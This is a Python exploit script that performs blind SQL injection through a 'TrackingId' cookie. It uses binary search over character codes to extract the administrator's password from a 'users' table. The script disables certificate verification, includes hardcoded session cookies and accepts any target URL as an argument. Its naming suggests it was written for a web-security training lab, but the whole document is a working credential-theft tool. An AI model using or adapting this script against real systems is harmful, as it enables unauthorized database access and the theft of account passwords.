import sys
import requests
import urllib
import urllib3

# Disable warnings about insecure requests (for HTTPS without certificates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url):
    """
    Attempts to extract the administrator's password using a blind SQL injection 
    vulnerability by employing binary search to optimize the character extraction process.
    
    Args:
        url (str): The target URL vulnerable to SQL injection.
    """
    password_extracted = ""  # Store the extracted password

    # Extract up to 20 characters of the password (adjust as necessary)
    for i in range(1, 21):  
        low = 32  # Start of printable ASCII range
        high = 126  # End of printable ASCII range
        
        while low <= high:  # Binary search for each character
            mid = (low + high) // 2  # Find the middle of the current ASCII range

            # SQL injection payload: Use binary search logic on the character's ASCII value
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator') > %s--" % (i, mid)
            
            # URL encode the payload to prevent issues with special characters
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            # Set the cookies with the SQL injection payload
            cookies = {
                'TrackingId': 'Qz0t07rLl3gIdr1i' + sqli_payload_encoded,
                'session': 'FzSZifUmDY5gIPRd50hT3rerz9q2dqDu'  # Session cookie
            }

            try:
                # Send the request to the server with the modified cookie
                r = requests.get(url, cookies=cookies, verify=False, timeout=120)
                
                # Check if the server response indicates a successful condition
                if "Welcome" not in r.text:
                    # If the response indicates an error, the character is less than or equal to mid
                    high = mid - 1
                else:
                    # If no error, the character is greater than mid
                    low = mid + 1

            except requests.Timeout:
                print(f"\n(-) Timeout occurred at position {i}. Retrying...")
                continue

        # Append the correct character after binary search finishes
        password_extracted += chr(low)
        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()

    print("\n(+) Password extraction complete.")
    return password_extracted

def main():
    """
    Main function to validate input and initiate password extraction via SQL injection.
    """
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(1)
    
    url = sys.argv[1]  # Retrieve the target URL from command line arguments
    print("(+) Retrieving password...")
    sqli_password(url)  # Initiate password extraction

if __name__ == "__main__":
    main()
